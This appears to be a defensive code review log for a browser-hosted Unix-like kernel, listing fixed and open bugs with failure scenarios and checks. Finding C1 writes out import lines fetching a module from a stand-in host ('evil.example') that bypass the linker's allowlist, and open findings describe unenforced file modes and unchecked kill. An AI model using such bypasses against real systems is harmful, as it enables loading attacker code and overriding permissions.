# Code review findings, 2026-11

A review of the **implementation** rather than the designs. `REVIEW-FINDINGS.md` is the design
pass and is not superseded by this.

Six critics, one per slice, each given the files and the acceptance criteria and **not** the
author's conclusion. The slices were: the kernel core; the fs codecs and the ABI; the libos trust
boundary and the programs; the kernel's devices and the exec loader; the harness; and a repo-wide
sweep for duplication, dead code and hand-synced constants. 144 findings came back.

## How to read a row

Every finding carries an **address** and a **failure scenario**; one without both was sent back
rather than recorded. The **verdict** is mine, not the critic's:

- **CONFIRMED** — I reproduced it, or read the cited lines and the claim holds. The evidence is
  named in the row.
- **REPORTED** — the critic gave an address and a scenario and I have not independently
  reproduced it. A REPORTED row is a lead, not a fact. Several will be wrong.
- **REJECTED** — checked and the claim does not hold.

and the **disposition**:

- **FIXED** — changed, with a check that was shown capable of failing.
- **OPEN** — recorded, not fixed. Each says why.

**Nothing here is fixed without a check.** A fixed bug that cannot be observed failing is the
defect this project already paid for twice (`MILESTONES.md` M4, M4b: "mechanisms that had never
run").

---

## FIXED

### C1. The program linker's allowlist is defeated by a comment

- Severity: **critical** (the trust boundary M5 and M6 both rest on)
- Address: `src/kernel/exec.mjs:134` as it was — `ANY_SPECIFIER`
- Verdict: **CONFIRMED by execution.** Reproduced against the real `linkProgram`.

**Failure scenario.** The extractor required the keyword and the quote to be separated by
whitespace only, and **a comment is not whitespace**. Measured:

```
import "//evil.example/p.mjs";                  REFUSED
import/*c*/"//evil.example/p.mjs";              PASSED, specifier in the output verbatim
import {x} from /*c*/ "//evil.example/p.mjs";   PASSED, specifier in the output verbatim
```

The unrewritten specifier travels into the Blob and the **child's** module loader fetches it —
which is the exact defect `exec.mjs`'s own header records as already found and fixed once, reached
again through a four-character comment. Four syscalls from any process: write a program to `/tmp`,
chmod it, spawn it. Worse, `resolved` goes to `0` rather than to an error, so the counter the
header offers as the tell does not fire.

**Fix.** The extractor is now a single-pass scanner (`specifiersIn`) that tracks the four lexical
states a specifier can hide behind — line comment, block comment, and the two string quotes — so a
comment is *skipped* rather than trusted, and a string counts as a specifier only when the last
significant token was `import`, `from` or `import (`. Rewriting slices at the offsets the scanner
recorded; a second regex pass would have reintroduced the gap. A property access is excluded, so
`Array.from("abc")` is not refused as an unknown specifier.

**Check.** `bench/m5-exec/link.mjs` — 37 assertions: 11 refusals including all six hidden forms,
every program in the tree still links with its specifier rewritten, and six strings that must
*not* be mistaken for specifiers. `--control` restores the old regex and asserts the six hidden
cases come back with **zero collateral**: measured `hiddenCaught 0, collateral []`, so the control
breaks the subject and not something adjacent.

### C2. A non-UTF-8 program could not be refused

- Severity: **minor**
- Address: `src/kernel/exec.mjs:160` — `new TextDecoder("utf-8", { fatal: false })`
- Verdict: **CONFIRMED** by reading. `fatal: false` never throws.

**Failure scenario.** The `catch` returning `-ENOEXEC` was unreachable, so a non-UTF-8 file with
an execute bit decoded to U+FFFD, linked, became a Blob and faulted inside the child — the outcome
the ENOEXEC arm exists to avoid, and one that reports as "the process never issued a syscall".

**Fix.** `{ fatal: true }`, with the reason stated at the declaration.

### C3. The purity gate could not see a clock, and a clock was being read in the replay path

- Severity: **major** (a gate blind to the one breach present)
- Address: `src/fs/vfs.mjs:251` (`now = Date.now` default) and `scripts/fsfuzz.py` `FORBIDDEN`
- Verdict: **CONFIRMED.** `Date.now` was absent from `FORBIDDEN`; `src/fs/fsck.mjs:184` builds a
  VFS without passing a clock.

**Failure scenario.** `VFS`'s constructor defaulted `now` to `Date.now`, and `#alloc` falls back
to `this.now()` for any op whose `t` is undefined. `fsck` constructs `VFS.parse(...)` with no
clock, so **replay read the wall clock**: two `fsck` runs over identical bytes produced different
mtimes. A parse path that is not a function of its input is not fuzzable, which is the premise the
whole `src/fs/` purity rule rests on — and the lint could not see it.

**Fix.** Two halves, deliberately disjoint. `FORBIDDEN` now includes `Date.now`,
`performance.now`, `Math.random` and `crypto.getRandomValues`, because a clock is a capability
like storage. And the constructor has **no default clock**: omitting it yields a clock that
refuses by name, so a replayed op with no timestamp is an error instead of a silently invented
value. The capability moved to the edges that have it — `src/kernel/store.mjs` passes `Date.now`
at both fresh-volume sites, and `src/kernel/tmpfs.mjs` already did.

**Check.** `scripts/fsfuzz.py` reports `8 module(s) in src/fs/ ... pure` with the extended list,
129/129 host tests, 42/42 edge assertions, 10,000 torn journals with 0 crashes and 0 silent
acceptances, and the `--no-crc` control still finding 2,767.

### C4. Five subprocess exit statuses were discarded, so the fs gate could report clean over an interpreter that failed

- Severity: **major** (harness honesty)
- Address: `scripts/fsfuzz.py:382, 392, 402, 412, 425`
- Verdict: **CONFIRMED.** Every `run_node` return code was bound and never read; `rc` at 412 also
  overwrote `rc` from 382.

**Failure scenario.** Only `json.loads` succeeding counted as "it ran". A script that printed its
summary and then failed afterwards exited non-zero and the gate reported clean.

**Fix.** Each invocation's status is now a gate, collected in `exits` — declared before the first
run, because `problems` is assigned after them and appending to it there would have been an
`UnboundLocalError`, i.e. a gate that crashes rather than reports.

**Check and its negative control.** The `--no-crc` control is **exempt with the reason recorded**:
with the CRC check removed the fuzzer *must* find silent acceptances, so it exits non-zero by
design (measured: 2,767 acceptances, exit 1), and gating on its status reported the working
control as a failure. What that control owes is asserted on the acceptance count instead.
The gate was then shown capable of firing: with `bench/fs-fuzz/hosttest.mjs` made to exit 1, the
run prints `host tests 129/129 pass` **and** `bench/fs-fuzz/hosttest.mjs exited 1`, exit 1 — the
clean-report-over-a-failed-interpreter case, caught. File restored after.

Note on reach: all three node scripts end in an explicit `process.exit(...)` derived from their
own failure count, so the "prints then throws in teardown" scenario is not reachable in them
today. The gate is defence against the next script that does not.

### C5. `namemax` was published as a raw `255` by two filesystems

- Severity: **major** (the single defect `CLAUDE.md`'s one-source-of-truth rule names)
- Address: `src/kernel/synth.mjs:331` and `src/kernel/tmpfs.mjs:82`, against `src/abi.mjs:285`
- Verdict: **CONFIRMED** by grep. `src/kernel/calls.mjs:1416`'s own comment says every field must
  come *from the filesystem* including `namemax`; two filesystems then hardcoded it.

**Failure scenario.** Raise `NAME_MAX`. `/proc`, `/dev` and `/tmp` keep answering
`statfs().namemax === 255` while the kernel accepts a longer component, so a program that sizes a
buffer from `statfs` truncates a name `open` would have accepted.

**Fix.** Both import `NAME_MAX` from `src/abi.mjs`.

### C6. Three programs' read buffers were 65536 against a `MAX_INLINE` of 65404

- Severity: **minor**
- Address: `src/bin/cat.mjs:18`, `src/bin/head.mjs:24`, `src/bin/wc.mjs:22`
- Verdict: **CONFIRMED.** `read()` clamps to `MAX_INLINE` (`src/libos/syscall.mjs:365`), so 132
  bytes of each buffer were unreachable and `cat.mjs:10`'s "in MAX_INLINE-sized pieces" was false.

**Fix.** All three import `MAX_INLINE` and size the buffer from it, which also makes the comment
true. `src/libos/std.mjs` already did this correctly.

### C7. The trace render limit had a second copy under a comment claiming one renderer

- Severity: **minor**
- Address: `src/kernel/kernel.mjs:2256` (`|| 256`) against `src/kernel/devfs.mjs:20`
- Verdict: **CONFIRMED.** `kernel.mjs:33` already imported `renderTrace` from that module.

**Failure scenario.** Raise `TRACE_RENDER_LIMIT` in `devfs.mjs` and a process reading `/dev/trace`
sees the new limit while the page's `trace-read` still asks for 256 — the page and a process shown
two different traces, which is what the line's own comment says cannot happen. `|| 256` also
rewrote an explicit `limit: 0`.

**Fix.** Import the constant; `m.limit > 0 ? (m.limit | 0) : TRACE_RENDER_LIMIT`.

### C8. The console's input size was a hand-copied pty constant

- Severity: **minor**
- Address: `src/kernel/console.mjs:55` against `src/abi.mjs:358` (`PTY_INPUT_BYTES: 4096`)
- Verdict: **CONFIRMED.** The copy was numerically correct; the coupling was not expressed.

**Failure scenario.** The comment states the coupling — "the same number ... a queue larger than
the thing it feeds would only move where the overflow happens". Change `PTY_INPUT_BYTES` and that
stated rationale breaks silently.

**Fix.** `export const CONSOLE_INPUT_BYTES = PTY_INPUT_BYTES;`

---

## OPEN — confirmed, not fixed

Each of these I verified at its address. None is fixed, and the reason is the same for all of
them: **they change kernel behaviour that only the browser suite can validate, and the fix is a
judgement about semantics rather than a mechanical correction.** They are recorded here with the
evidence so the next session starts from the finding and not from the hunt.

### O1. An fd's access mode is never enforced

- Severity: **critical**
- Address: `src/kernel/calls.mjs:426` is the only place `O_ACCMODE` is read in the whole tree.
- Verdict: **CONFIRMED by grep.** `d.flags` is read back only for `O_APPEND`
  (`src/kernel/store.mjs:1579`, `src/kernel/files.mjs:198`) and for `/proc` display
  (`src/kernel/procfs.mjs:102`). No dispatcher, no ops row and no `Store` method tests
  `d.flags & O_ACCMODE`.

**Failure scenario.** A uid-1000 process opens a root-owned `0444` file `O_RDONLY` — granted,
because `#may` is asked for R only. It then calls `write(fd, ...)`: the handler resolves the fd,
`KIND_OPS[F_FILE].write` reaches `Store.writeFd`, copy-up, blob write, and `fsync` publishes it.
A file with no write bit for anyone was rewritten. `ftruncate(fd, 0)` on the same read-only fd
destroys it outright. Symmetrically, `read` on an `O_WRONLY` fd returns bytes the mode denies.
This voids constraint 29's claim that credentials make the mode bits mean something.

**Why not fixed here.** The fix is to record `readable`/`writable` on the description at `open`
and refuse in four handlers. That is small, but it can turn any existing proof that writes through
a carelessly-opened fd into a failure, and which proofs those are is only discoverable by running
m2/m3/m4/m4b/m5 and reading the label sets. It needs its own commit, its own check (a `0444` file
opened `O_RDONLY` refusing `write` and `ftruncate`), and a full suite run.

### O2. A reaped slot is still dispatched

- Severity: **major**
- Address: `src/kernel/kernel.mjs:789-793` (`slot.port.onmessage`) and `:458` (`onSyscall`)
- Verdict: **CONFIRMED by reading.** `onSyscall`'s first act after `depth`/`tIn` is
  `Atomics.load(p.ctl, CALLID)`; neither it nor its two variants tests `slot.state` or `slot.ctl`.

**Failure scenario.** A process posts `SYS_spawn`; before the kernel drains it the page posts
`end-process` for that pid. The kill is handled first — fds closed, ZOMBIE, worker terminated —
and the queued syscall is then dispatched on the zombie, so a process killed through the UI gets
one free `spawn` after death, and `reap` refuses to run twice so nothing can kill the child it
makes. Separately, a message arriving after `table.free` reads `Atomics.load(p.ctl, CALLID)` with
`p.ctl === null`, which throws out of `port.onmessage` into `self.onerror` and **panics the
kernel**, telling every live process the kernel is dead. Constraint 55 measures ~2.0 s of
continued execution against the 2.2 s quarantine — a 149 ms margin.

**Why not fixed here.** A one-line state guard at each dispatcher is the fix, but "which states
may be dispatched" is a semantic call the quarantine design owns, and getting it wrong silently
drops real syscalls rather than failing loudly. Needs the suite.

### O3. A `ready` message resurrects a zombie and parks its parent forever

- Severity: **major**
- Address: `src/kernel/kernel.mjs:900-907`
- Verdict: **CONFIRMED by reading.** The `ready` arm assigns `slot.state = RUNNING` with no test
  of the current state, and `onProcessMessage` has no state guard.

**Failure scenario.** A child is reaped before its `ready` lands (`shutdown` reaps every live slot
including SPAWNING ones). The queued `ready` flips it back to RUNNING. The parent then calls
`waitpid(-1)`: `firstZombieChild` finds nothing because the state is RUNNING, `hasChild` is true,
so it parks — and nothing will answer it. The worker is terminated, so no `result` and no `fault`
arrive, and `table.free` does not wake parked parents. The parent hangs with no child in the
table and no diagnostic.

**Why not fixed here.** Same reason as O2; the two share a fix and should share a commit.

### O4. `kill` performs no credential check

- Severity: **major**
- Address: `src/kernel/kernel.mjs:1535` (`deliverSignal`), `src/kernel/calls.mjs:1507`
- Verdict: **CONFIRMED by reading.** `deliverSignal` validates only the target's existence;
  the handler validates only `1 <= sig <= 31`. `EPERM` is imported in `kernel.mjs` and never
  raised here. `docs/ABI.md`'s own row for `kill` lists `PERM`, and nothing can produce it.

**Failure scenario.** The page spawns a program with `uid: 1000`; that process calls
`kill(1, SIGKILL)` and reaps the uid-0 shell. Mode bits are enforced on every path call while the
process table is not enforced at all.

**Why not fixed here.** POSIX's rule (`caller.uid === 0 || caller.uid === target.uid`, per member
for the pgid arm) is clear, but the m4/m4b/m5 proofs send signals across processes constantly and
whether every one of them shares a uid is only answerable by running them. A blind EPERM here
could turn the Ctrl-C proofs red.

### O5. `setpgid` never validates the pgid

- Severity: **major**
- Address: `src/kernel/calls.mjs:1524-1535`
- Verdict: **CONFIRMED by reading.** The checks cover the target; `target.pgid = pgid` accepts any
  integer.

**Failure scenario.** A process calls `setsid()`, then `setpgid(0, G)` where `G` is a pgid in
another session. `pgidMembers(G)` now contains a member from session 1, so session 2's
`ioctl(TIOCSPGRP, G)` hits the session test at `calls.mjs:1153` and answers `-EPERM` — the shell
cannot give the terminal to its own pipeline. Constraint 166 records what that costs.
`kill(-G)` from session 2 also reaches the intruder.

### O6. `spawn` leaks a process-table slot on every throwing arm

- Severity: **major**
- Address: `src/kernel/kernel.mjs:730-841`
- Verdict: **CONFIRMED by reading.** `table.alloc()` runs first, and
  `new SharedArrayBuffer(SAB_BYTES)`, `new MessageChannel()` and `new Worker(RUNTIME_URL)` can all
  throw with nothing releasing the slot.

**Failure scenario.** Under the memory pressure constraint 156 records, a SAB allocation fails.
The slot stays in `table.slots` and `table.live` as SPAWNING forever — `reap` is never called for
it, so `scheduleFree`/`table.free` never run. After `PROC_CAP` such failures every `spawn` returns
`-EAGAIN` for the kernel's life, and meanwhile the phantom appears in `/proc`, `pgidMembers`,
`signalGroup` and `kstats`, and a `go` addressed to it posts into a dead port — which `awaitReady`
reports as kernel starvation, the misdiagnosis that function exists to prevent.

**Fix is mechanical** (`try { ... } catch (e) { IO?.unregister(slot.pid); table.free(slot); throw e; }`)
and is the best candidate of this group to take first.

### O7. `#alloc` does not refuse an inode number already in the table

- Severity: **critical** (replay)
- Address: `src/fs/vfs.mjs` `#alloc`, at `this.inodes.set(inode.ino, inode)`
- Verdict: **CONFIRMED by reading** — no `inodes.has(number)` guard; the critic additionally
  measured `readdir("/")` going from `['keep','f']` to `[]`.

**Failure scenario.** `applyOp`'s MKDIR/CREATE/SYMLINK arms check for a colliding *name* and not a
colliding *inode number*, so one CRC-valid journal record naming an existing ino replaces a live
inode. Pointing it at the root empties the filesystem — the "building a tree nobody wrote" case
the contract above `applyOp` claims to prevent.

**Why not fixed here.** This belongs with the wider op-field validation the same critic raised
(O8), because fixing the collision alone leaves every other unvalidated field. The 10,000-case
fuzzer does not currently reach op-level mutations, so the fix also owes the fuzzer a new
generator — which is the real work.

### O8. `applyOp` trusts every field but `op.k`

- Severity: **major**
- Address: `src/fs/vfs.mjs` `applyOp`; `decodeOp` checks only that `k` is a known string
- Verdict: **CONFIRMED by reading.**

**Failure scenario.** A CRC-valid record `{"k":"create","dir":1,"name":"x"}` with no `t` sets the
root inode's `mtime`/`ctime` to `undefined`; `serialize` emits a root row with no `mtime`, and the
next mount refuses the **whole volume** — naming inode 1 rather than the record that did it. The
clock fix in C3 converts this particular path into a named refusal at replay time, which is
better, but the other fields (`uid`, `gid`, `atime`, `mode`) are still unvalidated: a string
`uid` makes `inode.uid === cred.uid` permanently false, so the recorded owner can never chmod
their own file.

### O9. `parse` does not range-check `mode`

- Severity: **major**
- Address: `src/fs/vfs.mjs:1117` — `Number.isInteger(row.mode)` with no range test, and no
  `& 0o7777` mask, unlike `#alloc`
- Verdict: **CONFIRMED by reading.** The critic measured `access()` succeeding for uid 1000 on a
  root-owned 0600 file whose mode column was `-1`, because `(mode >> shift) & 7` is 7 for every
  shift.

### O10. Three codecs check the reserved field before the CRC

- Severity: **minor**, but it misdirects every reader
- Address: `src/fs/superblock.mjs:77`, `src/fs/journal.mjs:88`, `src/fs/image.mjs:77`
- Verdict: **CONFIRMED by reading.** `superblock.mjs:85-87` places the `major` check *after* the
  CRC on purpose, with the comment "so 'this image is from the future' is never reported about
  corrupt bytes" — and the reserved check two lines up breaks that stated rule in the same
  function.

**Failure scenario.** One flipped bit in the reserved field reports `bad-reserved`, so `fsck`
calls single-bit corruption a format/version problem and sends the reader after a writer that does
not exist.

### O11. The realm strip omits five bindings the CSP cannot cover

- Severity: **major** (hardening, not a boundary — `src/libos/lockdown.mjs:13-17`)
- Address: `src/libos/lockdown.mjs:35-90` (`TARGETS`)
- Verdict: **REPORTED**, and the reasoning is sound but **unmeasured**: the critic asserts
  presence from WebIDL exposure, not from a browser. `WorkerGlobalScope.close()`,
  `BroadcastChannel`, `navigator.locks`, `EventSource` and `navigator.sendBeacon` are absent from
  the list, and the served policy (`default-src 'none'; script-src 'self' blob:; connect-src
  'none'`) does not reach a BroadcastChannel or a lock.

**Failure scenario (the worst of them).** `self.close()` kills a process's own worker with no
`result`, no `fault` and no `onerror`. There is no per-process liveness check, so the slot stays
RUNNING forever, its SAB is never released, and a parent in `waitpid` is never answered and never
times out, because the kernel heartbeat keeps advancing.

**Why not fixed here.** Adding a row is one line each, but the probe must come first: the five
names have to be confirmed present in a Chrome 157 dedicated worker before a row claiming to
remove them means anything. That probe is one line in the shape `bench/m6-realm/program.mjs`
already uses, and it needs a browser.

### O12. The M6 probe restates the strip list instead of importing it

- Severity: **major** (it is why O11 is invisible)
- Address: `bench/m6-realm/program.mjs:267-275` against `src/libos/lockdown.mjs:28-34`
- Verdict: **CONFIRMED by reading.** `TARGETS`'s own docstring says the list exists "so it can be
  enumerated by a check instead of restated in one"; the probe restates all eleven names by hand.

**Failure scenario.** The check asks only "did you remove what you listed", so a name missing from
both copies cannot fail. This is the finding that makes O11 reachable, and it should be fixed
*with* O11 — importing `TARGETS` and asserting absence against a separately-authored candidate
list is the shape that would have caught it.

---

## OPEN — reported, not independently verified

These came with addresses and scenarios. I have not reproduced them. Ordered by the severity the
critic assigned. **A row here is a lead.**

### The kernel's devices and exec

| # | Address | Claim |
| --- | --- | --- |
| R1 | `src/kernel/pty.mjs:308` | `writeOutput` never checks `masters === 0`, so a slave write with the master closed fills the 16 KiB ring and then parks forever — no errno, no SIGPIPE, no EOF. `Pipe.write` does the symmetric check. |
| R2 | `src/kernel/providerfs.mjs:88` | Objects are read with a 1 MiB `READ_CEILING` and `readRange` never compares the body length against the request, so an object over 1 MiB mounts as its first 1,048,576 bytes with no error. |
| R3 | `src/kernel/pipe.mjs:165`, `src/kernel/pty.mjs:479` | A writer with a SIGPIPE handler gets `-EINTR` instead of `-EPIPE`, repeatedly, because `#epipe` tests `inflight === null` — which the interrupt path also produces. `stats.killedByEpipe` is charged for a writer that was not killed. |
| R4 | `src/kernel/pty.mjs:162` | A cc slot of 0 matches input byte 0x00, so disabling VINTR the POSIX way turns any NUL on the master into SIGINT for the foreground group. |
| R5 | `src/kernel/pty.mjs:173` | ISIG flushes the partial line but not the completed-line queue, so `ls\n` then Ctrl-C runs `ls` on the next read. |
| R6 | `src/kernel/pty.mjs:254` | `#commitLine` drains the line buffer unconditionally and discards whatever `input` will not take, including the terminating newline — so a later read blocks for a line that can never arrive. |
| R7 | `src/kernel/exec.mjs:218` | `evictTo` revokes an image's blob URL as soon as the cache ceiling is passed, protecting only the just-inserted key — so two concurrent large spawns can revoke A's URL before A's worker fetches it. |
| R8 | `src/kernel/providers.mjs:132` | `template.replace("{path}", clean)` interprets `$&`, `` $` `` and `$'` in the replacement. Measured by the critic: `urlFor("jsdelivr","a$`b")` doubles the origin. Harmless with today's three templates; an injection point for any template with a suffix. |
| R9 | `src/kernel/kernel.mjs:1385` | Teardown drops parked `poll` records but has no equivalent for parked **device** records, which hold a view over the dead process's SAB and keep it reachable past the quarantine. |
| R10 | `src/kernel/synth.mjs:194` | The LINK trap is in `lstat` (the correct behaviour) rather than `stat` (the one the comment names as wrong). |
| R11 | `src/kernel/synth.mjs:258` | `openDecision` runs the generator twice per `open`, against the rule `#info` states with its measurement. |
| R12 | `src/kernel/devfs.mjs:120` | `lookup` generates content eagerly, so `ls /dev` renders the trace once per listing and `stat /dev/trace` renders it to publish `size: 0`. |
| R13 | `src/kernel/pipe.mjs:98` | `#live` mutates `stats.stale` as a side effect of a liveness query and is called twice per record, so a clean `yes \| head -1` reports `stale: 1`. |
| R14 | `src/kernel/pty.mjs:122` | `stats` declares no `epipe` key, so `report().epipe` is `undefined` until one occurs; `pty.mjs:481`'s `|| 0` hides it. |
| R15 | `src/kernel/trace.mjs:74` | `this.enabled` is written once in the constructor and nowhere else, so the guard in the hot path cannot be taken — against a header claiming nothing is behind a flag. |
| R16 | `src/kernel/trace.mjs:192` | The layout self-test sums field widths against 32 rather than marking a byte map, so two fields at the same offset pass. |
| R17 | `src/kernel/providerfs.mjs:141` | Trailing slashes are stripped before keying, so `stat("/usr/bin/ls/")` succeeds where POSIX requires ENOTDIR. |
| R18 | `src/kernel/pty.mjs:180` | VERASE pops one byte, so backspacing over a multi-byte character leaves a lead byte and desynchronises the screen from the buffer. |
| R19 | `src/kernel/pty.mjs:219` | ECHO writes control bytes raw; every real tty with ECHOCTL prints `^C`. Undocumented divergence rather than a chosen one. |
| R20 | `src/kernel/kernel.mjs:1107` | `openChardev` writes `console1.opens` and `openedEver` from `kernel.mjs` while the decrement is `Console.close()` — two writers of one invariant across a file boundary. |

### The kernel core and the store

| # | Address | Claim |
| --- | --- | --- |
| R21 | `src/kernel/store.mjs:1703`, `:1536` | `extentFd` skips its re-base on the strength of "this kernel never changes the mount mode after `mount()`", and `snapshotHeld` changes it. A mid-session demotion then pairs a live-base size with an old-base blob, and `closeHeld` discards acknowledged bytes while returning 0. |
| R22 | `src/kernel/store.mjs:1458` | `freeInode` asks to free generations already removed at each commit swing, so every ordinary unlink emits false leak notes and inflates `noteCount` — the one counter built to make a real unpublished write assertable. |
| R23 | `src/kernel/store.mjs:687` | The idle flush does `.catch(() => {})`, and `flushJournalHeld` clears `this.dirty` before the await and restores it only on the errno arm. A throw there would leave records unflushed with no timer and no report. The critic could not reach a throw. |
| R24 | `src/kernel/files.mjs:390` | The overflow control's `kept` computes nothing (`min(min(length, 65404), 16360)`), and 16360 — wanix's truncation point from constraint 9 — is an unnamed literal. |
| R25 | `src/kernel/kernel.mjs:413`, `src/kernel/io-inline.mjs:40` | `outstanding()` has no caller, and the inline host's copy returns a hard-coded 0 — so the moment anything reads it, the negative control reports quiescent while work is in flight. |
| R26 | `src/kernel/calls.mjs:108` | The 4096 path ceiling is an unnamed literal counting UTF-16 units, and `readTwoPaths` (`rename`, `link`, `symlink`) applies no ceiling at all. |
| R27 | `src/kernel/store.mjs:1390` | `commitOnce`'s "no handle row" arm is unreachable, and handles silently what `resolve` calls a kernel defect. |

### The fs codecs

| # | Address | Claim |
| --- | --- | --- |
| R28 | `src/fs/vfs.mjs:698` | `rename`'s subtree guard walks `parent` with no iteration bound, and `parse` never checks that the parent chain reaches the root — so a self-parented directory wedges the dispatch worker. The critic measured a 4 s SIGTERM with no output. |
| R29 | `src/fs/fsck.mjs:220` | `BigInt(decoded.object.journalFirstSeq ?? 0)` over attacker-shaped image JSON throws `RangeError`/`SyntaxError` where `fsck` owes a `MOUNT_REFUSE` verdict. |
| R30 | `src/fs/vfs.mjs:933` | RENAME's `op.replaced` is dead data; the arm recomputes the standing entry and frees whatever is there, so a record can make the kernel delete a blob it says nothing about. |
| R31 | `src/fs/vfs.mjs:913`, `:900` | UNLINK and RMDIR ignore the `ino` the record carries and remove whatever the name now holds. |
| R32 | `src/fs/fsck.mjs:156` | A superblock slot with bytes but fewer than `SUPER_BYTES` is excluded from `damaged` and counted in `absentSlots`, so a torn write reports `mountable rw, problems 0`. |
| R33 | `src/fs/vfs.mjs:615` | `openDecision` is documented as applying permission rules "and NOTHING else" and then calls `applyOp`, with no inverse beside `revertCommit` for a create. |
| R34 | `src/fs/superblock.mjs:44`, `src/fs/journal.mjs:57` | `lo`/`hi`/`join` are two hand-written copies of `packI64`/`unpackI64`, which `src/fs/` is permitted to import. |
| R35 | `src/fs/journal.mjs:78` | `decodeRecord`, `decodeImage` and `decodeSuperblock` are the same seven-step container validator three times — which is why O10's ordering bug is in all three. |
| R36 | `src/fs/vfs.mjs:343` | `NAME_MAX` is compared against UTF-16 length, so a 200-character/400-byte name is accepted against a published `namemax` of 255. `#info` already measures a symlink target in bytes. |
| R37 | `src/fs/vfs.mjs:232` | `decodeOp`'s `catch (e) { return null; }` discards the reason, so `fsck` reports one message for truncated, wrong-shaped and unknown-kind payloads alike. `image.mjs:93` keeps the detail. |
| R38 | `src/fs/superblock.mjs:72` | `decodeSuperblock(null)` throws a `TypeError` out of a module whose contract is "never throws; a bad image is a reason". |

### The libos and the programs

| # | Address | Claim |
| --- | --- | --- |
| R39 | `src/libos/syscall.mjs:260`, `:264` | The libos's own early returns do not write `ctl[R1] = -1`, which `isErr` requires — so after any successful call `write()` reads `isErr(-EINTR, 0)` as false and returns **0**. A prompt is silently not printed; `seek()` returns the errno as a file offset. |
| R40 | `src/bin/sh.mjs:404` | `waitJob` treats any negative `waitpid` as already-reaped, but `-EINTR` is routine. `$?` is 0 where POSIX gives 130, and the child can be left unreaped. |
| R41 | `src/libos/syscall.mjs:269` | `srcLen` is bounded by neither `MAX_INLINE` nor `src.length`, so a large `poll` set faults the process with SIGABRT instead of `-EINVAL`, and a raw call can publish a length longer than the buffer — the kernel then reads the previous call's tail. |
| R42 | `src/bin/sh.mjs:189`, `src/bin/kill.mjs:73` | `kill -9 %1` expands to `kill -9 -- -3`; `--` is only honoured first, so it falls into the target loop and exits 2 after signalling. |
| R43 | `src/libos/shlex.mjs:240` | `\$` inside double quotes keeps its backslash and the span stays expandable, so `echo "\$HOME"` prints the value rather than `$HOME`. |
| R44 | `src/bin/sh.mjs:672` | A stage's `SPAWN_CLOSE` covers only its own redirection fds, so `echo hi > a \| cat` leaves `cat` holding a writable fd on `a` for its whole life. |
| R45 | `src/bin/wc.mjs:71`, `src/bin/ls.mjs:116`, `src/bin/ps.mjs:97`, `src/bin/head.mjs:98` | `std.say`'s errno is ignored, against the contract `src/bin/echo.mjs:13` states — so `wc -l big > /tmp/out` at the tmpfs ceiling returns exit 0 for output that does not exist. |
| R46 | `src/bin/sh.mjs:610` | The reap guard is `failed !== null`, which is never set on the throw path the comment above it says it covers. Latent: no reachable throw found. |
| R47 | `src/bin/sh.mjs:951`, `src/bin/term.mjs:67` | Constraint 94's "hold fd 0 first" is implemented twice and divergently — `/dev/null` in one, `/dev/zero` in the other, whose own comment explains why `/dev/zero` is wrong — and both return a **closed** fd as success. |
| R48 | `src/bin/term.mjs:85`, `src/bin/sh.mjs:855` | Constraint 131's two-`EINTR` fact has two renderers, one of them unreachable per R39. |
| R49 | `src/bin/sh.mjs:637` | `resolveCommand` runs before `openRedirections`, so `nosuchcmd > f` neither creates nor truncates `f`. Divergence is data-safe but unrecorded. |
| R50 | `src/bin/sh.mjs:731` | `setPgrp`'s return is discarded on both the take and the restore, while `src/bin/term.mjs:163` checks both. |
| R51 | `src/libos/syscall.mjs:762`, `:784` | `rawWriteLength` and `probeNotEqual` skip the SIGPEND entry check and the `kernelDown` guard, and are handed to every program through `env`. |
| R52 | `src/bin/sh.mjs:103-110` | The comment says a job spec expands anywhere in an unquoted word and that `kill -TERM -%1` works; `shlex.jobSpecOf` requires the whole word, and the same file says so correctly at `:174`. |

### The harness

| # | Address | Claim |
| --- | --- | --- |
| R53 | `scripts/check.py:947` (audit rule 11) | 259 of 394 expectation labels are turned red by no negative control. Rule 11 requires a control per **check**, nothing requires one per **claim**. The count is exact; the consequence is not measured. |
| R54 | `scripts/check.py:3730` | `len({colours}) == len(painted)` is `1 == 1` on a healthy machine, so repainting `.bad` green — the defect the comment names — leaves the label passing. |
| R55 | `scripts/check.py:4360` | `"ms" in evidence` is a substring test over stringified JSON, satisfied by the key `thresholdMs`. No number is compared, against a comment claiming the bound is checked against a figure. |
| R56 | `scripts/check.py:5340` | `every other syscall answers correctly` asserts only `api.ok`; the call count reaches only a note that is dropped when the expectation holds. Every neighbouring M2 section has an anti-vacuity clause. |
| R57 | `scripts/check.py:6931` (×4), `:6348` (×2) | Six labels assert the *absence of failures* with the row count only in the failure detail, so an empty row list passes — including `regress no finding reopened`, whose whole job is to say five named defects stayed closed. |
| R58 | `www/m2.html:1567` | `await k.expect('snapshot', 20000).catch(() => null)` discards both the result and the timeout, so the section can measure a different scenario than the one it reports. |
| R59 | `www/index.html:95` | The worker probe's `timeout`/`error` flags are never surfaced; three rows then render MISSING with three static reasons, none of which is what happened. Fail-closed, but misattributed. |
| R60 | `scripts/check.py:5581` | In the two fixture phases the canonical tree **is** the served tree, so `matches_disk` compares the server with itself — the defect its own docstring exists to prevent. |
| R61 | `scripts/check.py:913` (audit rule 4) | The inversion opt-out is accepted on truthiness, so `no_invert_reason=" "` disarms a check and prints an empty reason. No check uses it today. |
| R62 | `scripts/check.py:291` | A re-fetch failure in the witness is reported as a tree mismatch — a product failure for a harness fault — where the sibling branch refuses to do exactly that. |
| R63 | `scripts/check.py:1571` | Console failures are counted twice: once as `Outcome.FAIL` at `run_one`, once in the `status` sum. |
| R64 | `scripts/check.py:6203` etc. | `ev` and `section_ok` are re-defined verbatim inside six check bodies — twelve definitions. |
| R65 | `scripts/check.py:7353` | `len(stripped) >= 6` is an unnamed literal behind a label claiming **every** target was stripped, while the lockdown strips at least eight. |
| R66 | `scripts/check_links.py:31`, `:50` | `PATH_RE` only matches paths inside backticks or parentheses, so a bare path in prose is never checked; and `checked += 1` runs before the `OWED` skip, so the statistic counts references it did not check. |
| R67 | `scripts/check.py:6048` | No single command exercises the 18 declared controls, and nothing records when each last ran. The `note=` fields carry measurements from past hand runs. |
| R68 | `scripts/fsfuzz.py:446` | `edge["broken"]` is a bracket access where line 400 uses `.get`, so a payload without the key raises a bare traceback instead of a named gate failure. |
| R69 | `scripts/cdp.py:68`, `:292`, `:360` | Comments cite `tests/unit/test_cdp.py` and `docs/OBSERVATIONS.md` and justify SwiftShader flags with "which the map needs". Neither path exists here and there is no map; the file is copied verbatim from another project. |
| R70 | `www/m1.html:230` and four more | `try { k.worker.terminate() } catch (e) {}` with no reason, where `www/m2.html:434` writes the same call with `/* already gone is fine */`. |

### The repo sweep

